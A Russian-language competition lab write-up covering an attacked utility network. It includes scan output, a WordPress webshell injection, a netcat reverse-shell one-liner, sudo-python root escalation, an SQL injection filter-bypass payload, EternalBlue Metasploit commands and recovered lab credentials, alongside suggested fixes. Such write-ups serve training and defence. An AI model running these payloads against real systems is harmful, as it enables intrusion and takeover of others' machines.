# NTO2022 ThereIsNoInfoRoma _Axiom

## Легенда

Злоумышленник с помощью цепочки атак получил доступ к инфраструктуре предприятия, связанного с электроснабжением города. В результате большинство компьютеров было захвачено, доступ к ним потерян, а кое-где даже зашифрованы данные. Захватив промышленный сегмент, злоумышленник распространил бот-зловред, в результате которого на подстанции происходят аварийные события и блокируется работа операторов.

## Задача

Вам необходимо:
- Провести инвентаризацию хостов в 4 сетевых сегментах: сегмент DMZ (10.х.2.0/24), сегмент SERVERS (10.х.3.0/24), сегмент OFFICE (10.x.4.0/24) и сегмент АСУ ТП (10.x.239.0/24, 10.x.240.0/24).
- Расследовать цепочку атак злоумышленника, используя журналы безопасности и логи средств защиты.
- Вернуть контроль над захваченными компьютерами, восстановив легитимный доступ.
- Найти и расшифровать ценные файлы. - Остановить распространение бота-зловреда во всей инфраструктуре, а также понять, что он делает.

1) В каждом сегменте сети машины с адресами .1 .2 .3 .4 в четвертом октете не участвуют в задаче.
2) В вашей инфраструктуре в IP адрес вместо «Х» необходимо подставить второй октет ір адреса машины kali linux.

---

## user_names.txt 
```
#Учетка Linux серверов
admin

#Локальный админ windows
Administator (builtin)
Администратор

#Доменный админ windows
company.local\Administrator

#Учетная запись на межсетевом экране
user

#Админитративная учетка диспетчера АСУТП
oper
```

---

## Результаты скана nmap -ом:

### 10.31.2.0/24 ( Сегмент DMZ )

```shell
$ nmap 10.31.2.0/24 -sV

Nmap scan report for 10.31.2.10
Host is up (0.0043s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    nginx 1.14.2
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    nginx 1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Nmap scan report for 10.31.2.11
Host is up (0.0049s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: CLEAN-DRUPAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Nmap scan report for 10.31.2.12
Host is up (0.0048s latency).
Not shown: 985 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
25/tcp    open  smtp               SLmail smtpd 5.5.0.4433
79/tcp    open  finger             SLMail fingerd
106/tcp   open  pop3pw             SLMail pop3pw
110/tcp   open  pop3               BVRP Software SLMAIL pop3d
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: a31-slmail; OS: Windows; CPE: cpe:/o:microsoft:windows
 
Nmap scan report for 10.31.2.53
Host is up (0.0046s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
53/tcp open  domain  ISC BIND
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 10.31.3.0/24 ( Сегмент SERVERS )

```shell
$ nmap 10.31.3.0/24 -sV

Nmap scan report for 10.31.3.10
Host is up (0.0049s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-10 06:31:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: NS2; OS: Windows; CPE: cpe:/o:microsoft:windows
 
Nmap scan report for 10.31.3.20
Host is up (0.0039s latency).
Not shown: 969 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          Microsoft Exchange smtpd
80/tcp   open  http          Microsoft IIS httpd 10.0
81/tcp   open  http          Microsoft IIS httpd 10.0
110/tcp  open  pop3          Microsoft Exchange 2007-2010 pop3d
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          Microsoft Exchange 2007-2010 imapd
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
444/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
465/tcp  open  smtp          Microsoft Exchange smtpd
587/tcp  open  smtp          Microsoft Exchange smtpd
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
808/tcp  open  ccproxy-http?
993/tcp  open  ssl/imap      Microsoft Exchange 2007-2010 imapd
995/tcp  open  ssl/pop3      Microsoft Exchange 2007-2010 pop3d
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
2525/tcp open  smtp          Microsoft Exchange smtpd
3389/tcp open  ms-wbt-server Microsoft Terminal Services
3800/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3801/tcp open  mc-nmf        .NET Message Framing
3828/tcp open  mc-nmf        .NET Message Framing
6001/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
6565/tcp open  msrpc         Microsoft Windows RPC
6566/tcp open  msrpc         Microsoft Windows RPC
6667/tcp open  msrpc         Microsoft Windows RPC
6668/tcp open  msrpc         Microsoft Windows RPC
6689/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mx1.company.local; OS: Windows; CPE: cpe:/o:microsoft:windows
 
Nmap scan report for 10.31.3.50
Host is up (0.0035s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-10 06:32:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: NS1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### 10.31.4.0/24 ( Сегмент OFFICE )

```shell 
$ nmap 10.31.4.0/24 -sV

Nmap scan report for 10.31.4.6
Host is up (0.0098s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
Nmap scan report for 10.31.4.8
Host is up (0.0053s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: BUCHGARM; OS: Windows; CPE: cpe:/o:microsoft:windows
 
Nmap scan report for 10.31.4.10
Host is up (0.0036s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
Nmap scan report for 10.31.4.13
Host is up (0.0036s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### 10.31.239.0/24 (сегмент АСУ ТП [I] )

```shell
$ nmap 10.31.239.0/24 -sV

Nmap scan report for 10.31.239.5
Host is up (0.0064s latency).
Not shown: 990 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
80/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.7001
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: OIK-SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.31.239.6
Host is up (0.0071s latency).
Not shown: 990 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49175/tcp open  msrpc              Microsoft Windows RPC
49176/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: OIK-CLIENT; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### 10.31.240.0/24 (сегмент АСУ ТП [II] )
```shell
$ nmap 10.31.240.0/24 -sV

Nmap scan report for 10.31.240.5
Host is up (0.0065s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Nmap scan report for 10.31.240.6
Host is up (0.0069s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Nmap scan report for 10.31.240.9
Host is up (0.0076s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Nmap scan report for 10.31.240.10
Host is up (0.0080s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Nmap scan report for 10.31.240.14
Host is up (0.0093s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: A31-ENTEK; OS: Windows; CPE: cpe:/o:microsoft:windows
```



> Из результатов убраны ip с последним октетом .1 .2 .3 .4

---

## 10.31.2.10

- По 80 порту расположен сайт на WordPress.
- Результаты скана nikto:
```shell
$ nikto -h 10.31.2.10
 Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.31.2.10
+ Target Hostname:    10.31.2.10
+ Target Port:        80
+ Start Time:         2022-03-10 11:36:52 (GMT3)
---------------------------------------------------------------------------
+ Server: nginx/1.14.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with contents: <http://10.31.2.10/wp-json/>; rel="https://api.w.org/"
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/wp-admin/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /wp-app.log: Wordpress' wp-app.log may leak application/system details.
+ /wordpresswp-app.log: Wordpress' wp-app.log may leak application/system details.
+ /: A Wordpress installation was found.
+ /wordpress: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login.php: Wordpress login found
+ 7893 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2022-03-10 11:41:02 (GMT3) (250 seconds)
```

- robots.txt

```
User-agent: * 
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://10.31.2.10/wp-sitemap.xml
```

- http://10.31.2.10/wp-admin/ редирект на страницу авторизации
- WordPress 5.9.1
- Установлен Akismet plugin
- http://10.31.2.10/wp-json/ открытое API
- http://10.31.2.10/wp-json/wp/v2/users пользователь admin
```json
{
  "id": 1,
  "name": "admin",
  "url": "http://10.31.2.10",
  "description": "",
  "link": "http://10.31.2.10/author/admin/",
  "slug": "admin",
  "avatar_urls": {
    "24": "http://0.gravatar.com/avatar/f65445725c053a5c7d4e80d8e20dbf0e?s=24&d=mm&r=g",
    "48": "http://0.gravatar.com/avatar/f65445725c053a5c7d4e80d8e20dbf0e?s=48&d=mm&r=g",
    "96": "http://0.gravatar.com/avatar/f65445725c053a5c7d4e80d8e20dbf0e?s=96&d=mm&r=g"
  },
  "meta": [],
  "_links": {
    "self": [
      {
        "href": "http://10.31.2.10/wp-json/wp/v2/users/1"
      }
    ],
    "collection": [
      {
        "href": "http://10.31.2.10/wp-json/wp/v2/users"
      }
    ]
  }
}
```
- Результаты работы wpscan
```shell
$ wpscan --url 10.31.2.10                  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
 
[+] URL: http://10.31.2.10/ [10.31.2.10]
[+] Started: Thu Mar 10 13:43:21 2022
 
Interesting Finding(s):
 
[+] Headers
 | Interesting Entry: Server: nginx/1.14.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 
[+] robots.txt found: http://10.31.2.10/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%
 
[+] XML-RPC seems to be enabled: http://10.31.2.10/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
 
[+] WordPress readme found: http://10.31.2.10/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 
[+] The external WP-Cron seems to be enabled: http://10.31.2.10/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299
 
[+] WordPress version 5.9.1 identified (Latest, released on 2022-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.31.2.10/feed/, <generator>https://wordpress.org/?v=5.9.1</generator>
 |  - http://10.31.2.10/comments/feed/, <generator>https://wordpress.org/?v=5.9.1</generator>
 
[+] WordPress theme in use: twentytwentyone
 | Location: http://10.31.2.10/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://10.31.2.10/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://10.31.2.10/wp-content/themes/twentytwentyone/style.css?ver=1.3
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.31.2.10/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'
 
[+] Enumerating All Plugins (via Passive Methods)
 
[i] No plugins Found.
```

---

## Получение админских привелегий на Wordpress

Заходим на http://10.31.2.10/wp-scan и пробуем брутить логин\пароль. Подходит логин `admin` и пароль `admin`. 
Заходим в админку и выбираем Appearence -> Theme File Editor и открываем header.php.

Вставляем `echo system($_REQUEST['lol'])`, чтобы получить Remote Code Execution в системе.

![](https://i.imgur.com/2IcJHFB.png)

И теперь получаем reverse shell:
1) `nc -lnvp 1234` на машине
2) Делаем запрос на сайт со следующим пейлоадом: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.31.5.11 1234 >/tmp/f`, где `10.31.5.11` - наш ip, полученный с помощью ip addr. (http://10.31.2.10/?lol=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.31.5.11%201234%20%3E%2Ftmp%2Ff)

Возможный фикс: сменить пароль и логин в админке Вордпресса на более безопасный, используя большие и маленькие буквы, специальные символы(`$`, `'` и тп) и цифры. Например, логин - `MasterVan`, пароль - `G00dM^rn1ngSl$v3$$` 

## Privilege escalation on wordpress server
Запустим `python -c 'import pty; pty.spawn("/bin/bash")'` , чтобы получить bash. 
Теперь нужно поднять привелегии до root:

1) Запустим `cat /etc/sudoers` , чтобы получить список исполнуяемых файлов, которые могут быть запущены из под рута без введения пароля. Такой находится: `www-data ALL=(ALL:ALL) NOPASSWD: /usr/bin/python` (www-data - user, под которым мы находимся сейчас). 
3) Запустим `sudo /usr/bin/python` , пароля от нас не требуют. Сменим пароль для пользователя root:

```python
>>> import os
>>> os.system('id')
uid=0(root) gid=0(root) groups=0(root)
>>> os.system('passwd')
New password: aboba
passwd: password changed successfully
>>> exit()
```

> Позднее заменим пароль на более безопастный

3) Запускаем `su`, вводим новый пароль для рута (aboba) и получаем shell от пользователя root.

Возможный фикс: удалить строчку `www-data ALL=(ALL:ALL) NOPASSWD: /usr/bin/python` из /etc/sudoers

Для удобства прокинули ssh на машину, добавив в `/etc/ssh/sshd_config` строчку `PermitRootLogin yes` и запустили `service sshd restart`, чтобы изменения пришли в силу.
> Позже запретим подключение по SSH к руту строчкой `PermitRootLogin no`, так как это рождает уязвимость

---

## Найденные на сервере уязвимости

### Sql injection

В `/home/user/SolarApp_back/app.py` присутствует данный фрагмент кода:

```python
 
con = pymysql.connect(
    host='localhost',
    user='root',
    password='root',
    db='counter_information',
    charset='utf8mb4',
    cursorclass=pymysql.cursors.DictCursor
)
        def check_sql(region):
            vuln = ["select", "SELECT", "union", "UNION", "from", "FROM", " ", "  "]
            for v in vuln:
                if region.find(v) >=0:
                    error = True
                    message="Forbidden construct detected: '"+v+"'"
                    return error, message
            return False, ''    
         
        @app.route('/check_price', methods=['GET', 'POST'])
        def check_price():
            region = request.form['region_name']
            error, message = check_sql(region)
            if error:
                return render_template('index.html', error=error, message=message)
            cur = con.cursor()
            query = 'select counter_price from counter_cost where districtID LIKE \'' + region + '\';'
            try:
                cur.execute(query)
                rows = cur.fetchall()
                ...
            except:
                ...
```

Мы можем достать данные из базы данных с помощью sql инъекции. Пейлоад может быть примерно таким : `kkk'/**/uNIon/**/seLEct/**/213--'`

Возможный фикс:

```python
query = 'select counter_price from counter_cost where districtID LIKE %s;'
try:
    cur.execute(query, ['%'+region+'%'])
except:
    ...
```

Вторая уязвимость состоит в том, что пароль для базы данных слабый, его нужно сменить на более безопасный.

### Sql database dump

В `home/cadm/dump.sql` лежит дамп базы данных с логинами, почтами, телефонами, незахешированными паролями и другими конфиденциальными данными. 
Возможный фикс: Провести миграцию для хэширования паролей, дамп удалить.

---

## Eternal blue
С помощью `nmap --script smb-vuln* -p 139,445 <ip>` ,
Всего найдено 5 уязвимых к EternalBlue(CVE-2017-0143) айпи:
```
10.31.2.12 - DMZ
10.31.4.8 - Office
10.31.239.5 - АСУ ТП 1
10.31.239.6 - АСУ ТП 1
10.31.240.14 - АСУ ТП 2
```
На данных ip можем получить шелл, введя в metasploit
```
use windows/smb/ms17_010_eternalblue
set RHOST ip
exploit
```

## 10.31.239.6

* Были найдены зашифрованные файлы (и зашифрованный флаг)
* Также найден рансомвар шифрователь, нужно было найти аес ключ, но мы не нашли =)
* На рабочем столе ярлык для подключения к "НТК система", не удалось разобраться с подключением к ней.

## 10.31.239.5

* Запущен какой-то сервер для программы на `10.31.239.6`, был найден словарь для брута паролей, в логах обнаружены дествия с аккаунтом админа

## 10.31.2.12

* Запущен почтовый клиент `SLmail`, мы пробовали найти/получать письма, но не смогли. Доступ к панели админа был получен, но это не принесло никаких плодов.

## Найденные логины/пароли

* oper:america#1
* Администратор:Jonathan1

> Подключались по рдп к каждому из серверов, тыкали в разные файлики, смотретили клип `невер гона гив ю ап`

